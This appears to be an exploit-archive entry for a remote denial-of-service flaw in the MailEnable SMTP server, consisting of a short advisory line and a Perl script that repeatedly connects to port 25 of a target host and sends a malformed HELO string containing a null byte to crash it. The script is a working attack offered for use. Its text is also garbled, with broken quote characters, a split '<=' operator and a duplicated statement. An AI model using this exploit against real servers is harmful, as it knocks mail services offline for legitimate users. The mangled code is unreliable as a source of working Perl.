source: http://www.securityfocus.com/bid/18630/info

MailEnable is prone to a remote denial-of-service vulnerability.

This issue allows remote attackers to crash the application, denying further service to legitimate users.

#!/usr/bin/perl -w
#
# Mailenable SMTP DoS exploit
# 24/06/2006
#
# Filbert at divisionbyzero dot be
#

use Net::Telnet;

$string = �\0�99?;

for ($count = 1; $count < = 10; $count++)
{
$telnet = new Net::Telnet ( Timeout=>60, Errmode=>�return�,Port=>�25?);
$telnet->open($ARGV[0]);use Net::Telnet;
$telnet->print(�helo �, $string, �\n�);
}